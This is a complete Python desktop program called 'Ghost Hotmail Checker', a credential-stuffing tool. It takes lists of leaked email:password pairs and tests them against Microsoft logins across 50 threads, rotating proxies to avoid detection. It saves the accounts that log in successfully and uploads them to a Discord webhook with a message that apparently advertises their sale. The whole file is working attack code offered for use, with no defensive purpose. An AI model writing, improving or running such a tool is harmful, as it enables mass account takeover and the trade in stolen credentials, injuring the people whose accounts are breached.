import random
import threading
import requests
from mailhub import MailHub
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
from tempfile import NamedTemporaryFile
import os
import customtkinter as ctk
from tkinter import filedialog, messagebox, Text, END, WORD, NORMAL, DISABLED

init(autoreset=True)
mail = MailHub()
write_lock = threading.Lock()

def validate_line(line):
    parts = line.strip().split(":")
    if len(parts) == 2:
        return parts[0], parts[1]
    else:
        return None, None

def attempt_login(email, password, proxy, hits_file, local_hits_file):
    try:
        res = mail.loginMICROSOFT(email, password, proxy)[0]
        if res == "ok":
            log_text(f"Valid   | {email}:{password}", "green")
            with write_lock:
                hits_file.write(f"{email}:{password}\n")
                hits_file.flush()
                local_hits_file.write(f"{email}:{password}\n")
                local_hits_file.flush()
        else:
            log_text(f"Invalid | {email}:{password}", "red")
    except Exception as e:
        log_text(f"Error logging in {email}:{password} - {str(e)}", "red")

def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
    try:
        with open(combo_path, "r") as file:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for line in file:
                    email, password = validate_line(line)
                    if email is None or password is None:
                        log_text(f"Invalid format in line: {line.strip()}", "yellow")
                        continue
                    proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file))
                for future in futures:
                    future.result()
    except Exception as e:
        log_text(f"Error processing combo file: {e}", "red")

def send_to_discord(file_path, webhook_url):
    if os.stat(file_path).st_size == 0:
        log_text("The file is empty. No valid hits found.", "red")
        return
    try:
        with open(file_path, 'rb') as file:
            files = {
                'file': ('valid_hits.txt', file, 'text/plain')
            }
            payload = {
                'content': 'VALID HOTMAILS CHECKED WITH GHOST SELLZ CHECKER.\n'
            }
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                log_text("Successfully sent the file to Discord!", "green")
            else:
                log_text(f"Failed to send the file to Discord. Status code: {response.status_code}", "red")
    except Exception as e:
        log_text(f"An error occurred while sending the file: {e}", "red")

def log_text(message, color="black"):
    text_area.config(state=NORMAL)
    if color == "green":
        text_area.insert(END, message + "\n", "green")
    elif color == "red":
        text_area.insert(END, message + "\n", "red")
    elif color == "yellow":
        text_area.insert(END, message + "\n", "yellow")
    else:
        text_area.insert(END, message + "\n")
    text_area.config(state=DISABLED)
    text_area.see(END)

def start_checker():
    global temp_file
    combo_path = combo_entry.get()
    webhook_url = webhook_entry.get()
    proxy_path = proxy_entry.get()

    if not os.path.exists(combo_path):
        messagebox.showerror("Error", "Combo file does not exist.")
        return

    proxies = []
    if proxy_path:
        if not os.path.exists(proxy_path):
            messagebox.showerror("Error", "Proxy file does not exist.")
            return
        with open(proxy_path, "r") as proxy_file:
            proxies = proxy_file.readlines()

    # Disable buttons and entries during the check
    start_button.configure(state=DISABLED)
    combo_entry.configure(state=DISABLED)
    proxy_entry.configure(state=DISABLED)
    webhook_entry.configure(state=DISABLED)

    def run_checker():
        try:
            with open("valid_hits.txt", "a", encoding="utf-8") as local_hits_file:
                with NamedTemporaryFile(delete=False, mode='w', newline='', encoding='utf-8') as temp_file:
                    log_text("Starting login attempts...")
                    process_combo_file(temp_file, local_hits_file, proxies, combo_path)
                    log_text("Login attempts finished.")

                    if webhook_url:
                        send_to_discord(temp_file.name, webhook_url)
                    else:
                        log_text("Skipping Discord notification as no webhook URL was provided.")
        except Exception as e:
            log_text(f"An unexpected error occurred: {e}", "red")
        finally:
            # Re-enable buttons and entries after the check
            root.after(0, lambda: start_button.configure(state=NORMAL))
            root.after(0, lambda: combo_entry.configure(state=NORMAL))
            root.after(0, lambda: proxy_entry.configure(state=NORMAL))
            root.after(0, lambda: webhook_entry.configure(state=NORMAL))

    # Run the checker in a separate thread
    threading.Thread(target=run_checker, daemon=True).start()

def browse_combo():
    filename = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text Files", "*.txt")])
    if filename:
        combo_entry.delete(0, END)
        combo_entry.insert(0, filename)

def browse_proxy():
    filename = filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text Files", "*.txt")])
    if filename:
        proxy_entry.delete(0, END)
        proxy_entry.insert(0, filename)

# Create the main window
root = ctk.CTk()
root.title("Ghost Hotmail Checker")
root.geometry("800x600")

# Set the theme
ctk.set_appearance_mode("System")
ctk.set_default_color_theme("blue")

# Create a frame for the text area
text_frame = ctk.CTkFrame(root)
text_frame.grid(row=4, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

# Create a Text widget inside the frame
text_area = Text(text_frame, wrap=WORD, height=20, state=DISABLED, bg="#343638", fg="white", insertbackground="white", font=("Consolas", 12))
text_area.pack(fill="both", expand=True)

# Configure tags for text colors
text_area.tag_configure("green", foreground="green")
text_area.tag_configure("red", foreground="red")
text_area.tag_configure("yellow", foreground="yellow")

# Labels and Entries
ctk.CTkLabel(root, text="Path To Combo:", font=("Helvetica", 14)).grid(row=0, column=0, padx=10, pady=5, sticky="w")
combo_entry = ctk.CTkEntry(root, width=50, font=("Helvetica", 14))
combo_entry.grid(row=0, column=1, padx=10, pady=5)
ctk.CTkButton(root, text="Browse", command=browse_combo, font=("Helvetica", 14)).grid(row=0, column=2, padx=10, pady=5)

ctk.CTkLabel(root, text="Path To Proxies:", font=("Helvetica", 14)).grid(row=1, column=0, padx=10, pady=5, sticky="w")
proxy_entry = ctk.CTkEntry(root, width=50, font=("Helvetica", 14))
proxy_entry.grid(row=1, column=1, padx=10, pady=5)
ctk.CTkButton(root, text="Browse", command=browse_proxy, font=("Helvetica", 14)).grid(row=1, column=2, padx=10, pady=5)

ctk.CTkLabel(root, text="Discord Webhook URL:", font=("Helvetica", 14)).grid(row=2, column=0, padx=10, pady=5, sticky="w")
webhook_entry = ctk.CTkEntry(root, width=50, font=("Helvetica", 14))
webhook_entry.grid(row=2, column=1, padx=10, pady=5)

# Start Button
start_button = ctk.CTkButton(root, text="Start Checker", command=start_checker, font=("Helvetica", 14))
start_button.grid(row=3, column=0, columnspan=3, pady=20)

# Configure grid weights
root.grid_rowconfigure(4, weight=1)
root.grid_columnconfigure(1, weight=1)

# Run the application
root.mainloop()
